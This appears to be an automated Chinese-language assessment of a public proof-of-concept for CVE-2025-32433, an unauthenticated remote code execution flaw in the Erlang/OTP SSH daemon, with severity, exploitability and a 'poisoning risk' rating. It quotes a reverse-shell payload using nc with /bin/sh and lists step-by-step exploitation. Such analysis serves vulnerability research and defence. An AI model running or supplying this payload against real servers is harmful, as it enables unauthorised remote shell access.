## CVE-2025-32433 - Erlang/OTP SSH daemon RCE

**漏洞编号:** CVE-2025-32433

**漏洞类型:** RCE

**影响应用:** Erlang/OTP SSH daemon

**危害等级:** CRITICAL

**CVSS评分:** 10.0

**影响版本:** 具体版本范围未在搜索结果中明确，但涉及使用 Erlang/OTP SSH 库的应用

**利用条件:** 无需身份验证，目标开启了受影响的 SSH 服务且可被网络访问

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

POC有效性分析：该漏洞存在于 Erlang/OTP 的 SSH 协议消息处理逻辑中。分析提供的 POC 代码可知，其利用了 SSH 握手过程中的逻辑缺陷，通过发送构造的 `SSH_MSG_CHANNEL_OPEN` 和 `SSH_MSG_CHANNEL_REQUEST` 消息，在未经身份验证的情况下触发执行环境。POC 代码中的 `build_channel_request` 函数构造了一个带有 `exec` 类型的请求，其中包含了关键的 Erlang 负载 `os:cmd("nc {lhost} {lport} -e /bin/sh").`。由于 Erlang/OTP SSH 守护进程在处理此类请求时未能正确实施认证检查，攻击者可以直接在服务器上下文中执行该命令。代码展示了从建立 Socket 连接、发送 KEXINIT、到请求 Channel 的完整协议流程，逻辑清晰且符合 SSH 协议规范。该漏洞被定义为最高严重性，因为它允许远程、未经身份验证的攻击者直接获取系统 shell。经过代码走读，该脚本采用了标准的 Python socket 和 struct 库进行二进制协议拼装，不依赖复杂的第三方库，具有极高的实战利用价值。利用步骤：1. 准备一台具有公网 IP 或与目标网络连通的攻击机，并在指定端口（如 4444）开启监听。2. 修改脚本中的 `-lh` 和 `-lp` 参数为攻击机 IP 和监听端口。3. 运行脚本并指定目标地址 `-rh`。4. 脚本将建立 TCP 连接并进行 SSH 握手。5. 脚本在未登录的情况下直接发送 Channel 开启和执行请求，触发目标执行反弹 shell 命令。投毒风险分析：该 POC 代码结构透明，完全使用 Python 标准库实现，未发现任何代码混淆或加壳行为。其核心逻辑集中在构造 SSH 原始报文，代码可读性强，便于安全研究人员进行审计。在分析过程中，特别关注了其外部通信行为，除了与指定的远程主机（rhost）进行 SSH 通信以及建立反弹 shell 连接（lhost）外，脚本没有任何隐蔽的第三方连接或敏感信息上传行为。虽然脚本包含执行命令的 Payload，但这是作为漏洞验证所必需的 POC 功能，而非针对使用者本人的恶意行为。为了进一步降低风险，防御者在使用此类 POC 时，建议在隔离的沙箱环境运行，并截取网络流量确认其是否仅向目标 IP 发送数据。目前评估该代码段属于正常的漏洞研究脚本，但在生产环境应用前，应将 payload 替换为更无害的命令如 `id` 或 `whoami` 以验证漏洞存在性，避免直接建立反弹 shell 带来的额外风险。

**项目地址:** [https://github.com/vulnwatchdog/CVE-2025-32433](https://www.google.com/search?q=https://github.com/vulnwatchdog/CVE-2025-32433)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433)
